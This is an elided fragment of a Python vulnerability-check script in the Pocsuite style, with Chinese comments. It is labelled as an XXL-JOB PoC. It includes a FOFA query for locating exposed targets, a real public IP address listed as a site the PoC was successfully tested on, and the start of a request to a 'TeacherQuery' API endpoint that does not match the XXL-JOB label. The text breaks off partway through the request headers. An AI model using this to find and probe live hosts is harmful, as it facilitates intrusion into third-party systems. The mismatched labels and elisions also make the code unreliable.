...
class XXLJOBPOC(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "1701"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    ...
    references = ["peiqi"]  # 漏洞地址来源,0day不用写
    ...
    samples = ["http://123.139.201.130:8000/"]  # 测试样列,就是用 PoC 测试成功的网站
    ...
    def _check(self):
        ...
        url = f"{self.url}/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": "https://fofa.info/", "Accept-Encoding": "gzip, deflate",
